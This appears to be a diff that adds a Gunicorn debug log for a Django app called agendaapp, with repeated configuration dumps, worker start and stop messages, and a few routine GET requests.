+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7e7ba9912c40>
+  on_reload: <function OnReload.on_reload at 0x7e7ba9912e50>
+  when_ready: <function WhenReady.when_ready at 0x7e7ba9913060>
+  pre_fork: <function Prefork.pre_fork at 0x7e7ba99131c0>
+  post_fork: <function Postfork.post_fork at 0x7e7ba99133d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7e7ba99135e0>
+  worker_int: <function WorkerInt.worker_int at 0x7e7ba9913740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7e7ba9913950>
+  pre_exec: <function PreExec.pre_exec at 0x7e7ba9913ab0>
+  pre_request: <function PreRequest.pre_request at 0x7e7ba9913cc0>
+  post_request: <function PostRequest.post_request at 0x7e7ba9913e20>
+  child_exit: <function ChildExit.child_exit at 0x7e7ba9928040>
+  worker_exit: <function WorkerExit.worker_exit at 0x7e7ba99281a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7e7ba9928300>
+  on_exit: <function OnExit.on_exit at 0x7e7ba9928460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7e7ba99285c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x7e7ba9928a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x7e7ba9928bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x7e7ba9928d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x7e7ba9928eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-04 23:36:35 +0000] [62832] [INFO] Starting gunicorn 25.1.0
+[2026-03-04 23:36:35 +0000] [62832] [DEBUG] Arbiter booted
+[2026-03-04 23:36:35 +0000] [62832] [INFO] Listening at: unix:/run/agenda.socket (62832)
+[2026-03-04 23:36:35 +0000] [62832] [INFO] Using worker: sync
+[2026-03-04 23:36:35 +0000] [62832] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-04 23:36:35 +0000] [62838] [INFO] Booting worker with pid: 62838
+[2026-03-04 23:36:35 +0000] [62839] [INFO] Booting worker with pid: 62839
+[2026-03-04 23:36:35 +0000] [62840] [INFO] Booting worker with pid: 62840
+[2026-03-04 23:36:35 +0000] [62841] [INFO] Booting worker with pid: 62841
+[2026-03-04 23:36:35 +0000] [62842] [INFO] Booting worker with pid: 62842
+[2026-03-04 23:36:35 +0000] [62832] [DEBUG] 6 workers
+[2026-03-04 20:36:38 -0300] [62842] [DEBUG] GET /
+ - - [04/Mar/2026:20:36:38 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 23:54:58 +0000] [62832] [INFO] Handling signal: term
+[2026-03-04 20:54:58 -0300] [62840] [INFO] Worker exiting (pid: 62840)
+[2026-03-04 20:54:58 -0300] [62841] [INFO] Worker exiting (pid: 62841)
+[2026-03-04 20:54:58 -0300] [62838] [INFO] Worker exiting (pid: 62838)
+[2026-03-04 20:54:58 -0300] [62842] [INFO] Worker exiting (pid: 62842)
+[2026-03-04 20:54:58 -0300] [62839] [INFO] Worker exiting (pid: 62839)
+[2026-03-04 23:54:59 +0000] [62832] [INFO] Worker (pid:62838) was sent SIGTERM!
+[2026-03-04 23:54:59 +0000] [62832] [INFO] Worker (pid:62839) was sent SIGTERM!
+[2026-03-04 23:54:59 +0000] [62832] [INFO] Worker (pid:62840) was sent SIGTERM!
+[2026-03-04 23:54:59 +0000] [62832] [INFO] Worker (pid:62841) was sent SIGTERM!
+[2026-03-04 23:54:59 +0000] [62832] [INFO] Worker (pid:62842) was sent SIGTERM!
+[2026-03-04 23:55:29 +0000] [62832] [INFO] Shutting down: Master
+[2026-03-04 23:55:29 +0000] [63162] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7712dc79ec40>
+  on_reload: <function OnReload.on_reload at 0x7712dc79ee50>
+  when_ready: <function WhenReady.when_ready at 0x7712dc79f060>
+  pre_fork: <function Prefork.pre_fork at 0x7712dc79f1c0>
+  post_fork: <function Postfork.post_fork at 0x7712dc79f3d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7712dc79f5e0>
+  worker_int: <function WorkerInt.worker_int at 0x7712dc79f740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7712dc79f950>
+  pre_exec: <function PreExec.pre_exec at 0x7712dc79fab0>
+  pre_request: <function PreRequest.pre_request at 0x7712dc79fcc0>
+  post_request: <function PostRequest.post_request at 0x7712dc79fe20>
+  child_exit: <function ChildExit.child_exit at 0x7712dc7b4040>
+  worker_exit: <function WorkerExit.worker_exit at 0x7712dc7b41a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7712dc7b4300>
+  on_exit: <function OnExit.on_exit at 0x7712dc7b4460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7712dc7b45c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x7712dc7b4a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x7712dc7b4bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x7712dc7b4d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x7712dc7b4eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-04 23:55:29 +0000] [63162] [INFO] Starting gunicorn 25.1.0
+[2026-03-04 23:55:29 +0000] [63162] [DEBUG] Arbiter booted
+[2026-03-04 23:55:29 +0000] [63162] [INFO] Listening at: unix:/run/agenda.socket (63162)
+[2026-03-04 23:55:29 +0000] [63162] [INFO] Using worker: sync
+[2026-03-04 23:55:29 +0000] [63165] [INFO] Booting worker with pid: 63165
+[2026-03-04 23:55:29 +0000] [63162] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-04 23:55:29 +0000] [63166] [INFO] Booting worker with pid: 63166
+[2026-03-04 23:55:29 +0000] [63167] [INFO] Booting worker with pid: 63167
+[2026-03-04 23:55:29 +0000] [63168] [INFO] Booting worker with pid: 63168
+[2026-03-04 23:55:29 +0000] [63169] [INFO] Booting worker with pid: 63169
+[2026-03-04 23:55:29 +0000] [63170] [INFO] Booting worker with pid: 63170
+[2026-03-04 23:55:29 +0000] [63162] [DEBUG] 6 workers
+[2026-03-04 20:55:31 -0300] [63165] [DEBUG] GET /
+ - - [04/Mar/2026:20:55:31 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:58:30 -0300] [63166] [DEBUG] GET /
+ - - [04/Mar/2026:20:58:30 -0300] "GET / HTTP/1.1" 200 1023 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:58:33 -0300] [63170] [DEBUG] GET /
+ - - [04/Mar/2026:20:58:34 -0300] "GET / HTTP/1.1" 200 1023 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:58:34 -0300] [63170] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:20:58:34 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 23:58:59 +0000] [63162] [INFO] Handling signal: term
+[2026-03-04 20:58:59 -0300] [63170] [INFO] Worker exiting (pid: 63170)
+[2026-03-04 20:58:59 -0300] [63165] [INFO] Worker exiting (pid: 63165)
+[2026-03-04 20:58:59 -0300] [63166] [INFO] Worker exiting (pid: 63166)
+[2026-03-04 20:58:59 -0300] [63167] [INFO] Worker exiting (pid: 63167)
+[2026-03-04 20:58:59 -0300] [63168] [INFO] Worker exiting (pid: 63168)
+[2026-03-04 20:58:59 -0300] [63169] [INFO] Worker exiting (pid: 63169)
+[2026-03-04 23:58:59 +0000] [63162] [INFO] Worker (pid:63165) was sent SIGTERM!
+[2026-03-04 23:58:59 +0000] [63162] [INFO] Worker (pid:63166) was sent SIGTERM!
+[2026-03-04 23:58:59 +0000] [63162] [INFO] Worker (pid:63168) was sent SIGTERM!
+[2026-03-04 23:58:59 +0000] [63162] [INFO] Worker (pid:63169) was sent SIGTERM!
+[2026-03-04 23:58:59 +0000] [63162] [INFO] Worker (pid:63170) was sent SIGTERM!
+[2026-03-04 23:59:00 +0000] [63162] [INFO] Shutting down: Master
+[2026-03-04 23:59:00 +0000] [63227] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x75cef1bb6c40>
+  on_reload: <function OnReload.on_reload at 0x75cef1bb6e50>
+  when_ready: <function WhenReady.when_ready at 0x75cef1bb7060>
+  pre_fork: <function Prefork.pre_fork at 0x75cef1bb71c0>
+  post_fork: <function Postfork.post_fork at 0x75cef1bb73d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x75cef1bb75e0>
+  worker_int: <function WorkerInt.worker_int at 0x75cef1bb7740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x75cef1bb7950>
+  pre_exec: <function PreExec.pre_exec at 0x75cef1bb7ab0>
+  pre_request: <function PreRequest.pre_request at 0x75cef1bb7cc0>
+  post_request: <function PostRequest.post_request at 0x75cef1bb7e20>
+  child_exit: <function ChildExit.child_exit at 0x75cef1bcc040>
+  worker_exit: <function WorkerExit.worker_exit at 0x75cef1bcc1a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x75cef1bcc300>
+  on_exit: <function OnExit.on_exit at 0x75cef1bcc460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x75cef1bcc5c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x75cef1bcca90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x75cef1bccbf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x75cef1bccd50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x75cef1bcceb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-04 23:59:00 +0000] [63227] [INFO] Starting gunicorn 25.1.0
+[2026-03-04 23:59:00 +0000] [63227] [DEBUG] Arbiter booted
+[2026-03-04 23:59:00 +0000] [63227] [INFO] Listening at: unix:/run/agenda.socket (63227)
+[2026-03-04 23:59:00 +0000] [63227] [INFO] Using worker: sync
+[2026-03-04 23:59:00 +0000] [63230] [INFO] Booting worker with pid: 63230
+[2026-03-04 23:59:00 +0000] [63227] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-04 23:59:00 +0000] [63231] [INFO] Booting worker with pid: 63231
+[2026-03-04 23:59:00 +0000] [63232] [INFO] Booting worker with pid: 63232
+[2026-03-04 23:59:00 +0000] [63233] [INFO] Booting worker with pid: 63233
+[2026-03-04 23:59:00 +0000] [63234] [INFO] Booting worker with pid: 63234
+[2026-03-04 23:59:00 +0000] [63235] [INFO] Booting worker with pid: 63235
+[2026-03-04 23:59:00 +0000] [63227] [DEBUG] 6 workers
+[2026-03-04 20:59:30 -0300] [63234] [DEBUG] GET /
+ - - [04/Mar/2026:20:59:30 -0300] "GET / HTTP/1.1" 200 1023 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+[2026-03-04 20:59:31 -0300] [63234] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:20:59:31 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
